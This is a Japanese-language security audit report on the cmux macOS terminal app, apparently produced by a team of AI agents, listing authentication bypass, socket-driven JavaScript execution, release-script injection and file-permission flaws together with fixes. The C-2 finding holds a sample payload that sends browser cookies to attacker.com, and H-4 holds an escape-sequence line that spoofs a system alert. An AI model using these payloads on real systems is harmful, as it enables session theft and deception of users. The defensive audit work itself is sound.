# cmux セキュリティ監査レポート

**実施日:** 2026-03-13
**監査チーム:** レッドチーム15名 + 批評家5名 (計20エージェント)
**対象:** cmux macOS ターミナルアプリケーション
**方針:** 現実的に悪用可能な脆弱性のみを報告。理論的・非現実的な問題は除外。

---

## エグゼクティブサマリー

cmux は Ghostty ベースの macOS ターミナルエミュレータで、WebView ブラウザパネル、Unix ソケット IPC、CLI ツール、セッション永続化、自動更新 (Sparkle)、テレメトリ (PostHog/Sentry) を統合しています。

**全体評価: 中〜高リスク**

デフォルト設定（`.cmuxOnly` モード）でのシングルユーザー利用では合理的なセキュリティを提供していますが、ソケット認証・アクセス制御に重大な設計上の欠陥があり、リリースパイプラインにもコードインジェクションのリスクが存在します。

### スコアサマリー

| 深刻度 | 件数 | 説明 |
|--------|------|------|
| **CRITICAL** | 5 | 認証バイパス、任意コード実行、リリースパイプライン |
| **HIGH** | 7 | ファイル権限、シムリンク攻撃、エスケープシーケンス |
| **MEDIUM** | 8 | パスワード管理、ブルートフォース、設定の問題 |
| **LOW** | 4 | 情報漏洩、設定の不整合 |

---

## CRITICAL (深刻度: 致命的) — 5件

### C-1. ソケットパスワード認証の完全バイパス

**検出元:** RT12 (認証), RT1 (Socket/IPC), C1 (アーキテクチャ), C3 (脅威モデリング)
**信頼度:** 非常に高い（4エージェントが独立して確認）
**ファイル:** `Sources/TerminalController.swift:1277-1283`

**問題:** `.password` モードが有効でも、`authenticated` フラグが `processCommand()` に渡されていない。`authResponseIfNeeded()` がエラーレスポンスを返しても、認証状態と実際のコマンド実行が分離されている。

```swift
if let authResponse = authResponseIfNeeded(for: trimmed, authenticated: &authenticated) {
    writeSocketResponse(authResponse, to: socket)
    continue
}
let response = processCommand(trimmed)  // ← authenticated チェックなし
```

さらに、V2 プロトコルの `auth.login` コマンドは常に `"authenticated": true` を返す。

**影響:** パスワードモードを有効にしても、全ソケットコマンドが認証なしで実行可能。ターミナルへの任意テキスト入力、ブラウザ操作、ワークスペース制御がすべて無防備。

**悪用シナリオ:** ローカルプロセスが `/tmp/cmux.sock` に接続し、認証なしで `send_keys` や `browser.eval` を実行。

---

### C-2. ソケット経由の任意 JavaScript 実行（アクセス制御なし）

**検出元:** RT15 (アプリライフサイクル), RT9 (入力バリデーション), C1 (アーキテクチャ)
**信頼度:** 非常に高い
**ファイル:** `Sources/TerminalController.swift:6420-6437, 8879-8913`

**問題:** `browser.eval`, `browser.addinitscript`, `browser.addscript` ソケットコマンドは、任意の JavaScript コードをソケットクライアントから受け取り、WKWebView コンテキストで実行する。これらのコマンドにはコマンド単位のアクセス制御がない。

```swift
// browser.eval → callAsyncJavaScript() で直接実行
// browser.addinitscript → WKUserScript として永続的に注入（ページ遷移をまたいで持続）
```

**影響:** ソケットにアクセスできるプロセスは、ブラウザパネルで開いているすべてのWebページのCookie、localStorage、セッショントークンを窃取可能。`addinitscript` で注入されたスクリプトはページ遷移後も持続する。

**悪用シナリオ:**
```json
{"method": "browser.eval", "params": {"script": "fetch('http://attacker.com?c=' + document.cookie)"}}
```

---

### C-3. リリーススクリプトでの Python コードインジェクション

**検出元:** RT2 (コマンドインジェクション), RT8 (CI/CD)
**信頼度:** 高い
**ファイル:** `scripts/sparkle_generate_appcast.sh:99-117`

**問題:** DMG署名値 (`$SIGNATURE`) をサニタイズなしで Python コードに文字列補間している。

```bash
python3 -c "
sig = '$SIGNATURE'     # ← 未サニタイズ
length = '$DMG_LENGTH'  # ← 未サニタイズ
"
```

**影響:** `sign_update` ツールの出力が改ざんされた場合（サプライチェーン攻撃やMITM）、リリースビルドプロセスで任意の Python コードが実行される。署名済みリリースの改ざんに直結。

---

### C-4. アップデートフィード URL の戻り値バグ

**検出元:** RT5 (アップデート機構)
**信頼度:** 高い
**ファイル:** `Sources/Update/UpdateDelegate.swift:16-32`

**問題:** `feedURLString()` が `resolved.url`（フォールバックロジック適用済み）を計算するが、実際には未検証の `infoFeedURL` をそのまま返している。

```swift
func feedURLString(for updater: SPUUpdater) -> String? {
    let resolved = UpdateFeedResolver.resolvedFeedURLString(infoFeedURL: infoFeedURL)
    // resolved.url にはフォールバック HTTPS URL が入っている
    return infoFeedURL  // ← 未検証の元の URL を返却（nil の可能性あり）
}
```

**影響:** `infoFeedURL` が nil/空の場合、Sparkle のフォールバック動作が未定義になる。また、Info.plist への HTTP URL インジェクション時に HTTPS 強制が効かない。

---

### C-5. Sparkle 秘密鍵のコマンドライン引数経由の露出

**検出元:** RT8 (CI/CD)
**信頼度:** 高い
**ファイル:** `.github/workflows/release.yml:126`, `.github/workflows/nightly.yml:153`

**問題:**
```bash
DERIVED_PUBLIC_KEY=$(swift scripts/derive_sparkle_public_key.swift "$SPARKLE_PRIVATE_KEY")
```

コマンドライン引数は `ps aux` やシステムログから可視。CI ジョブ実行中に他のプロセスが秘密鍵を読み取れる。

**影響:** Sparkle 秘密鍵が漏洩した場合、攻撃者は悪意あるアップデートに正規の署名を付与可能。

---

## HIGH (深刻度: 高) — 7件

### H-1. セッションスクロールバックの不適切なファイル権限

**検出元:** RT4 (データ漏洩), C2 (データフロー)
**ファイル:** `Sources/SessionPersistence.swift:460-478`

**問題:** `/tmp/cmux-session-scrollback/` ディレクトリとファイルが `attributes: nil`（デフォルト権限）で作成される。ターミナル出力（パスワード、APIキーを含む可能性）が他ユーザー・プロセスから読み取り可能。

**推奨:** ディレクトリに `0o700`、ファイルに `0o600` を明示的に設定。

---

### H-2. Markdown ファイルウォッチャーのシムリンクフォロー

**検出元:** RT11 (ファイルパストラバーサル)
**ファイル:** `Sources/Panels/MarkdownPanel.swift:104-106`

**問題:** `open(filePath, O_EVTONLY)` がデフォルトでシムリンクをフォローする。`markdown.open` ソケットコマンドで任意パスを指定→シムリンク経由で `/etc/shadow` 等の変更を監視可能。

---

### H-3. セッション復元時のパス検証欠如

**検出元:** RT11 (ファイルパストラバーサル)
**ファイル:** `Sources/Workspace.swift:525-537`

**問題:** `~/.config/cmux/session-*.json` のスナップショットファイルは署名・検証なし。攻撃者がセッションファイルを改ざんし、任意のファイルパスを `markdown.filePath` に注入可能。アプリ再起動時に自動的に開かれる。

---

### H-4. OSC 777 通知インジェクション

**検出元:** RT13 (ターミナルエスケープ)
**ファイル:** `Sources/GhosttyTerminalView.swift:1738-1760`

**問題:** ターミナルの OSC 777 エスケープシーケンスからの title/body がサニタイズなしで macOS 通知に表示される。

```bash
echo -e '\033]777;notify;ALERT;Your system is compromised\007'
```

カスタム通知コマンドが設定されている場合、`CMUX_NOTIFICATION_TITLE` 等の環境変数経由でシェルコマンドに未サニタイズの値が渡される (`Sources/TerminalNotificationStore.swift:494-514`)。

---

### H-5. PlistBuddy コマンドインジェクション（開発スクリプト）

**検出元:** RT2 (コマンドインジェクション)
**ファイル:** `scripts/reload.sh:262-281`

**問題:** `--tag` パラメータが `sanitize_bundle()`/`sanitize_path()` を経るが、PlistBuddy 構文文字（`:` 等）をフィルタしない。PlistBuddy `-c` コマンドへの構文インジェクションが可能。

**注:** 開発用スクリプトのため影響範囲は限定的だが、共有環境では注意が必要。

---

### H-6. ブラウザダウンロードの TOCTOU レース条件

**検出元:** RT11 (ファイルパストラバーサル)
**ファイル:** `Sources/Panels/BrowserPanel.swift:4486-4500`

**問題:** `removeItem` と実際のファイル書き込みの間に攻撃者がシムリンクを作成可能。`O_CREAT | O_EXCL` を使用していない。

---

### H-7. Homebrew 等の依存関係バージョン未固定

**検出元:** RT8 (CI/CD), RT10 (依存関係)
**ファイル:** `.github/workflows/*.yml`

**問題:** CI で `brew install zig`, `brew install sentry-cli` 等がバージョン未指定で実行される。上流が侵害された場合、悪意あるバージョンが自動的にインストールされる。

---

## MEDIUM (深刻度: 中) — 8件

### M-1. ソケットパスワードの平文ファイル保存

**検出元:** RT1 (Socket), RT7 (ネットワーク), RT12 (認証), C3 (脅威モデリング)
**ファイル:** `Sources/SocketControlSettings.swift:175-198`

パスワードが `~/.config/cmux/socket-control-password` に平文保存。ファイル権限は `0o600` で適切だが、同一ユーザーの他プロセスからは読み取り可能。Keychain への移行を推奨。

### M-2. パスワードブルートフォース（レート制限なし）

**検出元:** RT1 (Socket), RT12 (認証), C3 (脅威モデリング)
**ファイル:** `Sources/TerminalController.swift:960, 992`

パスワード認証に遅延・ロックアウトなし。ローカル攻撃者が高速でパスワード推測を試行可能。

### M-3. postMessage ワイルドカードオリジン

**検出元:** RT3 (WebView)
**ファイル:** `Sources/Panels/BrowserPanel.swift:1424, 1476`

`window.top.postMessage({...}, "*")` でワイルドカードオリジンを使用。受信側もオリジン検証なし。影響はアドレスバーのフォーカス状態操作に限定されるが、セキュリティアンチパターン。

### M-4. シムリンク攻撃（最終ソケットパスファイル）

**検出元:** RT1 (Socket)
**ファイル:** `CLI/cmux.swift:509-514`

`/tmp/cmux-last-socket-path` がシムリンク検証なしで読み取られる。攻撃者が攻撃者制御のソケットパスにリダイレクト可能。

### M-5. Sentry DSN のハードコード

**検出元:** RT14 (シークレット), RT4 (データ漏洩)
**ファイル:** `CLI/cmux.swift:25`, `Sources/AppDelegate.swift:2149`

Sentry DSN がソースコードにハードコード。組織ID・プロジェクトIDが露出し、偽のエラーレポート送信が可能。

### M-6. npm 依存関係のバージョン緩い指定

**検出元:** RT10 (依存関係)
**ファイル:** `web/package.json`

多くの依存関係が `^` (caret) 指定で、将来の侵害パッケージが自動取得されるリスク。`posthog-js: ^1.350.0` は 2025年11月のサプライチェーン攻撃 (Shai-Hulud 2.0) の対象バージョンを含む。

### M-7. 正規表現 DoS (ReDoS)

**検出元:** RT9 (入力バリデーション)
**ファイル:** `Sources/Panels/BrowserPanel.swift:247-260`

ユーザー設定の正規表現パターンがタイムアウトなしでコンパイル・実行される。悪意あるパターンでアプリフリーズの可能性。

### M-8. シェルエスケープ関数の不完全性

**検出元:** RT9 (入力バリデーション)
**ファイル:** `Sources/GhosttyTerminalView.swift:117-123`

`escapeForShell()` が個別文字のバックスラッシュエスケープ方式を使用。改行文字やヌルバイトを処理しない。シングルクォートラッピングの方が安全。

---

## LOW (深刻度: 低) — 4件

### L-1. Xcode ビルド設定の不整合

**検出元:** RT6 (エンタイトルメント), C5 (macOS)

`ENABLE_HARDENED_RUNTIME = NO` と `CODE_SIGN_ENTITLEMENTS = ""` が Xcode プロジェクトに設定されているが、リリースビルドスクリプトで `--options runtime` と `--entitlements cmux.entitlements` で上書きされる。直接 `xcodebuild` を使う場合のみ問題。

### L-2. ブラウザ DevTools がリリースビルドで有効

**検出元:** RT3 (WebView)
**ファイル:** `Sources/Panels/BrowserPanel.swift:1964, 1989`

開発者ツールは開発者向けターミナルアプリとして意図的な可能性が高いが、`#if DEBUG` ガードの検討を推奨。

### L-3. ブラウザ履歴の平文保存

**検出元:** RT7 (ネットワーク)
**ファイル:** `Sources/Panels/BrowserPanel.swift:1045-1069`

`~/Application Support/com.cmux/browser_history.json` に URL、タイトル、訪問回数が平文 JSON で保存。

### L-4. テレメトリのソケットパス漏洩

**検出元:** RT4 (データ漏洩), C1 (アーキテクチャ)

Sentry ブレッドクラムにソケットパスが含まれる。デバッグタグ名からブランチ/機能情報が推測可能。

---

## 除外した項目（現実的に問題にならない）

以下は複数のエージェントが報告したが、現実的なリスクとして低いと判断し除外した項目です：

| 項目 | 除外理由 |
|------|----------|
| App Sandbox 未適用 | ターミナルエミュレータの設計上必須（プロセス生成、ファイルシステムアクセス） |
| JIT/unsigned memory エンタイトルメント | Ghostty ターミナルエンジンの動作に必要 |
| Camera/Microphone エンタイトルメント | ブラウザパネルの Web コンテンツ向け（WebRTC等） |
| NSAllowsArbitraryLoadsInWebContent | ブラウザパネルでの HTTP サイトアクセスに必要 |
| HTTP/HTTPS URL スキーム登録 | ブラウザ機能として意図的な設計 |
| AppleScript 有効化 | 設定で無効化可能、macOS 標準の自動化機能 |
| PostHog API キーのハードコード | 公開キーとして設計されている（`phc_` プレフィックス） |
| タイミング攻撃（パスワード比較） | ローカルソケットでは実用的な悪用が困難 |
| 環境変数でのパスワード渡し | 標準的なプラクティス、ファイルベースが推奨 |

---

## エージェント間のクロスバリデーション

最も重大な発見は複数のエージェントによって独立に確認されています：

| 発見 | 確認エージェント数 | エージェント |
|------|-------------------|-------------|
| ソケット認証バイパス (C-1) | 4 | RT12, RT1, C1, C3 |
| 任意 JS 実行 (C-2) | 3 | RT15, RT9, C1 |
| 平文パスワード保存 (M-1) | 4 | RT1, RT7, RT12, C3 |
| ファイル権限不備 (H-1) | 2 | RT4, C2 |
| リリーススクリプトインジェクション (C-3) | 2 | RT2, RT8 |

---

## 推奨対策（優先度順）

### 即時対応（1週間以内）

1. **C-1 修正:** `processCommand()` に `authenticated` パラメータを追加し、パスワードモード時に認証済みでないコマンドをブロック
2. **C-2 修正:** `browser.eval`, `browser.addinitscript`, `browser.addscript` にコマンド単位のアクセス制御を追加
3. **H-1 修正:** `SessionPersistence.writeReplayFile()` でディレクトリ `0o700`、ファイル `0o600` を明示設定

### 短期対応（1ヶ月以内）

4. **C-3 修正:** `sparkle_generate_appcast.sh` で Python に `subprocess.run()` を使用するか、変数をファイル経由で渡す
5. **C-4 修正:** `feedURLString()` の戻り値を `resolved.url` に修正し、HTTPS スキーム検証を追加
6. **C-5 修正:** Sparkle 秘密鍵を stdin 経由で渡す
7. **M-2 修正:** パスワード認証にレート制限（5回/60秒）とロックアウトを追加
8. **H-2 修正:** `O_SYMLINK_NOFOLLOW` フラグの使用

### 中期対応（3ヶ月以内）

9. **M-1 修正:** パスワード保存を Keychain に移行
10. **M-6 修正:** npm 依存関係を正確なバージョンに固定、`posthog-js` を最新版に更新
11. **H-7 修正:** CI の Homebrew パッケージをバージョン固定
12. ソケットコマンドのケイパビリティベース ACL（読み取り専用 / 書き込み / ブラウザ制御 等）の導入

---

## 全体評価

**デフォルト設定 (`.cmuxOnly` モード) でのシングルユーザー利用:** 合理的に安全。プロセス系統検証により、cmux の子プロセスのみがソケットに接続可能。

**`.password` モード利用時:** **安全ではない。** 認証バイパス (C-1) により、パスワードモードは実質的に無効。

**`.automation` / `.allowAll` モード利用時:** 高リスク。全ローカルプロセスがブラウザ制御・ターミナル入力を含む全コマンドを実行可能。

**リリースパイプライン:** 中〜高リスク。コードインジェクション (C-3) と秘密鍵露出 (C-5) により、リリースプロセスの完全性が脅かされる可能性がある。

---

*本レポートは20の専門エージェントによるコードベース全体の静的解析に基づいています。動的テスト（実行時のペネトレーションテスト）は実施していません。*
